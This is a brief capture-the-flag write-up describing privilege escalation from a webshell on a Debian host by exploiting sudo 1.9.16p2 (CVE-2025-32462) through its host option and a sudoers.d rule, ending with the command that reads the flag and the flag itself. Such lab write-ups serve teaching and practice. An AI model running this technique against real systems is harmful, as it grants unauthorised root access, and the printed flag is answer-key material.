- We get a webshell to a debian device
- No obvious SUID binaries and `sudo -l` doesn't work without prompting a password, no obvious privesc route
- `dpkg -l` shows the downloaded packages, searching through interesting ones like `sudo`, `python`, `gcc`, `vim`, etc. gives us:
 	- `sudo 1.9.16p2-2` (vulnerable for [CVE-2025-32462](https://github.com/cyberpoul/CVE-2025-32462-POC))
- Do `ls /etc/sudoers.d` and we see `dev`. `cat`ting it gives us:

```c
# helps when developing the challenges on the dev containers
ALL ctf-dev.crate.foi.se = NOPASSWD:ALL
```

- We can perform `sudo` commands via the above CVE by doing:

```sh
sudo -h ctf-dev.crate.foi.se <command>
sudo -h ctf-dev.crate.foi.se cat /flag.txt

# cratectf{hur_kunde_det_ta_12_år_att_hitta_denna}
```
